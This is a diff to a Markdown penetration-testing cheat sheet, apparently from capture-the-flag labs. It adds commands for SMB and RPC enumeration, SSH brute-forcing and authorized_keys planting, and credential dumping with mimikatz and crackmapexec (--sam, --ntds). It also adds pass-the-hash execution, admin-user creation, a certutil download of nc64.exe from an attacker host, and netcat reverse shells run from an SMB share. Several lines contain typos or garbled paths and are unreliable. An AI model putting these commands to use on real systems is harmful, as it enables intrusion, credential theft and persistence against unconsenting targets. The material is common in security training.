@@ -35,6 +35,7 @@
 		- [RDP](#rdp)
 		- [showmount](#showmount)
   		- [SMB](#smb)
+        - [Mount](#mount)
         - [DNS](#dns)
 		- [smbclient](#smbclient)
 		- [SSH](#ssh)
@@ -55,7 +56,6 @@
   		- [cadaver](#cadaver)
 		- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
 		- [ffuf](#ffuf)
-		- [Gobuster](#gobuster)
 		- [GitTools](#gittools)
 		- [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
 		- [PDF PHP Inclusion](#pdf-php-inclusion)
@@ -65,6 +65,7 @@
 		- [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
 		- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
 		- [Upload Vulnerabilities](#upload-vulnerabilities)
+        - [Gobuster](#gobuster)
 		- [wfuzz](#wfuzz)
         - [Ferobuster](#ferobuster)
 		- [WPScan](#wpscan)
@@ -109,6 +110,7 @@
 		- [Certipy](#certipy)
 		- [enum4linux-ng](#enum4linux-ng)
 		- [Evil-WinRM](#evil-winrm)
+        - [Crackmapexec](#crackmapexec)
 		- [Impacket](#impacket-1)
 		- [JAWS](#jaws)
 		- [Kerberos](#kerberos-1)
@@ -246,6 +248,7 @@
 | --- | --- |
 | Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
 | Metasploit | https://github.com/rapid7/metasploit-framework |
+| Hoaxshell | https://github.com/t3l3machus/hoaxshell |
 
 ### Post Exploitation
 
@@ -318,6 +321,7 @@
 | Sharpup | https://github.com/GhostPack/SharpUp |
 | PowerLurk | https://github.com/Sw4mpf0x/PowerLurk |
 | SUIDump | https://github.com/lypd0/SUIDump |
+| ADSearch |  https://github.com/tomcarver16/ADSearch |
 
 ### Exploit Databases
 
@@ -777,6 +781,22 @@ sudo impacket-smbserver <SHARE> . -smb2support
 copy * \\<LHOST>\<SHARE>
 ```
 
+##### Samba server
+
+```c
+service smbd start
+```
+
+Check is running
+
+```c
+smbclient -N \\\\127.0.0.1\\open\\
+```
+
+```c
+/etc/samba/smb.conf
+```
+
 ##### PowerShell
 
 ```c
@@ -1053,6 +1073,22 @@ dir /a:h
 dir flag* /s /p
 dir /s /b *.log
 ```
+
+
+```c
+systeminfo 
+netsat -nat // open ports
+netstat -ap tcp
+plink.exe -l root -pw perfect -R 445:127.0.0.1:445 10.10.14.16
+net user
+net user henrial contrasenia /add // new user
+net localgroup Administrators henrial /add //add to admin group
+net group  GROUPNAME USERNAME /add
+sc queryex type=service state=all | find /i "SERVICE_NAME:" // list services
+```
+
+Pagina web donde vienen los comandos y .exe 
+https://lolbas-project.github.io/#
 
 #### PHP Webserver
 
@@ -1485,6 +1521,58 @@ chown root:root sid-shell; chmod +s sid-shell
 mount.cifs //<RHOST>/<SHARE> /mnt/remote
 guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
 ```
+
+##### nbtscan
+
+```c
+nbtscan <ip>
+nbtscan -r <rango/x>
+```
+
+##### smbmap
+
+```c
+smbmap -H IP
+```
+
+```c
+smbmap -H IP -u 'null'
+```
+
+List recursevely the folder server-smb 
+
+```c
+smbmap -d DOMAIN -H IP -R CARPETA
+```
+
+Download
+
+```c
+smbmap -d DIRECTORIO -H IP -R CARPETA -A FIHCERO_DESCARGA
+smbmap -H [ip] -d [domain] -u [user] -p [password]
+```
+
+```c
+smbmap -H IP -u svc-printer -p "PASS" -r C$/DIRECTORY -A FILE.TXT
+```
+
+```c
+smbmap -H IP -u svc-printer -p "PASS" -g PATHTOFILE/FILE
+```
+
+```c
+smbmap -u ned.flanders_adm -p Lefthandedyeah! -d corp.local -H IP
+```
+
+##### smbcacls
+
+List privileges in folders 
+
+```c
+for file in $(ls); do echo $file; done | while read line; do echo -e "\n[*] $line:\n"; smbcacls //IP/DIRECTORY domain/$line -U USER%PASS | grep -i "everyone"; done
+smbcacls //IP/DIRECTORY domain/$line -U USER%PASS 
+```
+
 #### DNS
 
 ##### dig 
@@ -1568,12 +1656,40 @@ smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
 smbclient "\\\\<RHOST>\<SHARE>"
 smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
 smbclient --no-pass //<RHOST>/<SHARE>
+smbclient //IP//Folder -U 'USER%PASS' -c "dir"
+```
+If NT_STATUS_CONNECTION_DISCONNECTED 
+
+```c
+--option='client min protocol=NT1'
+```
+
+
+```c
+smbclient -L IP -N 2>/dev/null | grep “CARPETA” | awk '{print $1}' | while read sharedFolder; do echo "==="$(sharedFolder)"=="; smbclient //IP/${sharedFolder} -c "dir"; echo; done 
+
+smbclient -L IP -N | grep -i "disk" | sed 's/\s*\(.*\)\s*Disk.*/\1/'| while read sharedfolder; do echo "======{$sharedfolder}=====";smbclient -N "/IP/${sharedfolder}" -c dir; echo; done
 ```
 
 ```c
-smbclient -L IP -N 2>/dev/null | grep “CARPETA” | awk '{print $1}' | while read sharedFolder; do echo “===”$(sharedFolder)"=="; smbclient //IP/${sharedFolder} -c “dir”; echo; done 
+smbclient -N -L IP 2>/dev/null | grep "Sharename" | awk '{print $1}' 
+| while read sharedFolder; do echo "==="${sharedFolder}"=="; smbclient //IP/${sharedFolder} -c "dir"; echo; done
+```
 
-smbclient -L 10.10.11.152 -N | grep -i "disk" | sed 's/\s*\(.*\)\s*Disk.*/\1/'| while read sharedfolder; do echo "======{$sharedfolder}=====";smbclient -N "/IP/${sharedfolder}" -c dir; echo; done
+or
+
+```c
+smbclient -L 10.10.11.152 -N 2>/dev/null | awk '{print $1}' | tr -d ' '  | sed -n 4,10p | 
+while read sharedFolder; do echo "==="$(sharedFolder)"=="; smbclient //10.10.11.152/${sharedFolder} -c "dir"; echo; done
+```
+Download folders 
+
+```c
+smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'`
+```
+
+```c
+impacket-smbclient RANDOM@IP
 ```
 
 ##### Download multiple files at once
@@ -1589,6 +1705,100 @@ mget *
 
 ```c
 ssh user@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1
+```
+
+Introduce ower own public key on victims machine
+
+```c
+cat id_rsa.pub | tr -d '\n'  
+```
+
+```c
+echo "ssh_rsa" > uthorised_keys
+```
+
+```c
+ssh-keygen -f root
+```
+
+```c
+ssh -i root root@IP
+```
+
+Give privilege 600 
+```c
+chmod 600 KEYS
+```
+
+Bruteforce user pass
+
+```c
+medusa -h IP -U users.txt -P passwords.txt -M ssh IP
+patator ssh_login host=IP port=PORT password=PASS_FILE user=UserFILE persistent=0 -x ignore:mesg='failed.
+```
+
+Local port fordwarding 
+
+```c
+ssh> -L 9002:127.0.0.1:PORTservicio
+```
+
+```c
+ssh -i KEY user@IP
+```
+
+```c
+ssh user@IP -p PASS COMMAND
+```
+
+Crack rsa key
+
+```c
+ssh2john.py
+```
+
+First ssh2john ID to get the hash sshng 
+
+```c
+/usr/share/johj/ssh2john.py
+```
+
+```c
+/usr/share/john/ssh2john.py id_rsa > hash
+```
+
+Local port fordwarding de VNC
+
+```c
+sshpass -p 'PASS' ssh USER@IPvictim -L PORT:127.0.0.1:PORT
+```
+
+Execute commands
+
+```c
+sshpass -p 'PASS' ssh USER@IPvictim "command"
+```
+
+```c
+sshpass -p 'henrial123' ssh 10.10.14.42@10.10.10.119 "/usr/sbin/tcpdump -i any -w - 'not port 22'"  | wireshark -k -i -
+```
+
+Download files
+
+```c
+scp user@IP:/tmp/capture.pcap .
+```
+
+When getting the error 
+```c
+"no matching key exchane method found"
+ssh -okexAlgorithims=+diffie-hellman-group1-sha1 -p PORT user@IPpa
+```
+
+Sshuttle to pivot
+
+```c
+sshuttle -v -r MI_IP RED_Q_KIERO/24 --ssh-cmd 'ssh -i id_rsa'
 ```
 
 #### Time and Date
@@ -2160,23 +2370,6 @@ ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<RH
 ```c
 ./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
 ./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
-```
-
-#### Gobuster
-
-```c
--e    // extended mode that renders the full url
--k    // skip ssl certificate validation
--r    // follow cedirects
--s    // status codes
--b    // exclude status codes
--k            // ignore certificates
---wildcard    // set wildcard option
-
-$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
-$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
-$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
-$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
 ```
 
 ##### Common File Extensions
@@ -2841,6 +3034,23 @@ HTML/JS: HTML Injection / XSS / Open Redirect
 PNG / JPEG: Pixel Flood Attack
 ZIP: Remote Code Exection via Local File Inclusion
 PDF / PPTX: Server-Side Request Forgery / Blind XXE
+```
+
+#### Gobuster
+
+```c
+-e    // extended mode that renders the full url
+-k    // skip ssl certificate validation
+-r    // follow cedirects
+-s    // status codes
+-b    // exclude status codes
+-k            // ignore certificates
+--wildcard    // set wildcard option
+
+$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
+$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
+$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
+$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
 ```
 
 #### wfuzz
@@ -3956,6 +4166,7 @@ hashcat -m 1800 sha512 /PATH/TO/WORDLIST/<WORDLIST>
 hashcat -m 160 hmac-sha1 /PATH/TO/WORDLIST/<WORDLIST>
 hashcat -a 0 -m 0 hash.txt SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -O --force
 hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
+hashcat -a 0 -m 1000 ntlm.txt rockyou.txt // Crack NTL hashes
 ```
 
 ```c
@@ -4014,6 +4225,12 @@ $1 $2 $3 c $!
 
 ```c
 hashcat -r <FILE>.rule --stdout <FILE>.txt
+hashcat -a 0 -m 1000 ntlm.txt rockyou.txt -r rules\add-year.rule \\NTLM hashses
+```
+
+```c
+cat add-year.rule
+$2$0$2$0
 ```
 
 ##### Cracking ASPREPRoast Password File
@@ -4144,6 +4361,24 @@ sekurlsa::LogonPasswords
 meterpreter > getprivs
 meterpreter > creds_all
 meterpreter > golden_ticket_create
+```
+
+##### Dump  Kerberos encryption keys of currently logged on users
+
+```c
+sekurlsa::ekeys
+```
+
+##### Security Account Manager (SAM) database dumo the NTLM hashes of local accounts only
+
+```c
+lsadump::sam
+```
+
+##### Dump Domain Cached Credentials (DCC)
+
+```c
+lsadump::cache
 ```
 
 ##### Pass the Ticket
@@ -4963,12 +5198,24 @@ Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
 powershell -ep bypass
 . .\PowerUp.ps1
 Get-NetDomain
+Get-Domain //  object for the current
+Get-DomainController | select Forest, Name, OSVersion | fl
 Get-NetUser
 Get-NetUser | select cn
 Get-NetUser | select cn,pwdlastset,lastlogon
 Get-NetGroup | select cn
 Get-NetGroup "<GROUP>" | select member
 Convert-SidToName S-1-5-21-1987370373-658406905-1781884369-1104
+Get-ForestDomain
+Get-DomainPolicyData | select -expand SystemAccess
+Get-DomainUser -Identity <USER> -Properties DisplayName, MemberOf | fl
+Get-DomainComputer // all computers in the domain
+Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
+Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
+Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
+Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
+Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl
+Get-DomainTrust
 ```
 
 ##### Service Principal Name (SPN) Enumeration
@@ -5554,11 +5801,120 @@ certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <T
 enum4linux-ng -A <RHOST>
 ```
 
+```c
+pyhton3 nullnix IP
+```
+
 #### Evil-WinRM
 
 ```c
 evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
 evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p -u -S
+```
+
+#### Crackmapexec
+
+```c
+crackmapexec smb IP
+```
+
+```c
+crackmapexec smb IP -u 'user' -p 'passw' 
+```
+
+Dump admin hashes
+
+```c
+crackmapexec smb IP -u 'user' -p 'passw'  --sam
+```
+
+List ntlm hashes at directory level
+
+```c
+crackmapexec smb IP -u 'user' -p 'passw' --ntds vss 
+```
+
+```c
+crackmapexec smb IP -u 'user' -H 'HASH_NTLM'
+```
+
+Execute commands
+
+```c
+ crackmapexec smb IP -u wsadmin -H '669b12a3bac275251170afbe2c5de8c2' -x 'certutil -urlcache -f http://10.10.14.6/nc64.exe nc.exe'
+ crackmapexec smb IP -u USER -p 'PSS' --exec-method smbexec -x "whoami"
+```
+
+If its pwned then use psexec.py
+
+```c
+python psexec.py USER@IP
+impacket-psexec administrator@IP
+psexec USER@IP -hashes :HASH_NT
+psexec WORKGROUP/USER@PIP cmd.exe
+impacket-psexec WORKGROUP\username@IP cmd.exe
+```
+
+pipenv shell
+crackmapexec smb IP --shares
+
+Brute force password
+
+```c
+cme smb IP -u 'user' -p password.txt 
+```
+
+With credentials check all the network machines the user can log in
+
+```c
+cme smb IP.0/24 -u 'user' -p 'passw'
+```
+
+Continue running even after a success
+
+```c
+--continue-on-success 
+```
+
+With credentials run lookupsid.py in /usr/share/doc/python3-impacket/examples
+tu find more users 
+
+```c
+python3 lookupsod.py 'USER:PASSWD'@IP
+```
+If STATUS_PASSWORD_MUST_CHANGE
+
+```c
+smbpasswd -r 10.10.10.X -U "bhult"
+```
+
+old password and then new password 
+
+### Mount
+
+```c
+mount -t cifs"//IP/Folders" /mnt/smbmounted
+```
+
+Not real samba privileges, it is manage by the acl (access control list)
+
+```c
+mount -t cifs //IP/DIRECTORY /mnt/smbmounted -o username=USERNAME,password=PASSWORD,domain=DOMAIN_NAME,rw
+mount -t cifs -o username=<win_share_user> //WIN_SHARE_IP/<share_name> /mnt/win_share
+```
+
+```c
+sudo mount -t cifs -o username=Finance,password=Acc0unting //htb.local/ACCT /mnt/smb
+```
+
+If there is a port 111 then rpcinfo: nfs use 
+
+```c
+showmount -e IP
+```
+
+```c
+mount -t nfs IP:/FOLDER /mnt/nfs
 ```
 
 #### Impacket
@@ -5723,6 +6079,29 @@ impacket-smbpasswd <RHOST>/<USERNAME>:'<PASSWORD>'@<RHOST> -newpass '<PASSWORD>'
 
 ```c
 impacket-smbserver local . -smb2support
+impacket-smbserver smbFolder $(pwd) -smb2support
+impacket-smbserver smbFolder $(pwd) -smb2support -username henrial -password henrial
+```
+Client side
+
+```c
+ net use \\IP\smbFolder /u:henrial hernial123
+ copy  \\IP\smbFolder\FILE C:\RUTA\FILE
+```
+
+Powershell on the victims machine
+
+```c
+• $pass = ConvertTo-SecureString 'HENRIAL_PASS' -AsPlainText -Force
+• $cred = New-Object System.Management.Automation.PSCredential('vk9guest', $pass)
+• New-PSDrive -Name henrialsmb -PSProvider FileSystem -Credential $cred -Root \\10.10.14.X\smbFolder
+```
+
+In windows
+
+```c
+start /b \\IP\smbFolder\dir -e cmd IPDestino nc.exe 444
+\\IP\smbFolder\nc.exe -e cmd IP PORT
 ```
 
 ##### impacket-ticketer
@@ -8156,6 +8535,59 @@ rpcclient -U '' -N  IP -c "enumdomusers" | awk '{print $1}' | cut -d ":" -f2 | t
 ```
 
 ```c
+rpcclient -U "username"IP
+```
+
+anonymus 
+```c
+rpcclient -U '' -N IP
+```
+
+
+```c
+ rpcclient -U USER IP -W DOMAIN_NAME
+```
+
+```c
+ rpcclient [-A authfile] [-c <command string>] [-d debuglevel] [-l logdir] [-N] [-s <smb config file>] [-U username[%password]] [-W workgroup] [-I destinationIP] {server}
+enumdomusers
+enumdomgroups
+querygroupmem RID
+Administrator have rid de 0x200
+	
+https://www.willhimages/ackforsushi.com/sec504/SMB-Access-from-Linux.pdf
+```
+
+```c
+rpcclient -U 'USER%PASS' IP
+```
+
+```c
+-c "enumdomusers" -N | grep -oP ‘\[.*?\]’ | grep -v 0x | tr -d ‘[]’
+```
+
+```c
+python3 GetADUsers.py -all DOMAIN/USER:PASWW -dc-ip IP
+```
+
+```c
+rpcclient -U '' -N  IP -c "enumdomusers" | awk '{print $1}' | cut -d ":" -f2 | tr -d "[]"
+```
+
+Printers
+
+```c
+enumprinters
+```
+
+
+Change password
+
+```c
+setuserinfo2 tlavel 23 ‘NewPass’
+```
+
+```c
 dsr_getdcname
 dsr_getdcnameex
 dsr_getdcnameex2
@@ -8192,6 +8624,8 @@ srvinfo
 .\Rubeus.exe asreproast /outfile:hashes.asreproast
 .\Rubeus.exe kerberoast /nowrap
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+.\ Rubeus.exe triage \\  list all the Kerberos tickets in your current logon session
+.\ Rubeus.exe dump /luid:(LUID OF USER) /service:krbtgt
 ```
 
 ##### Request a Delegation Ticket
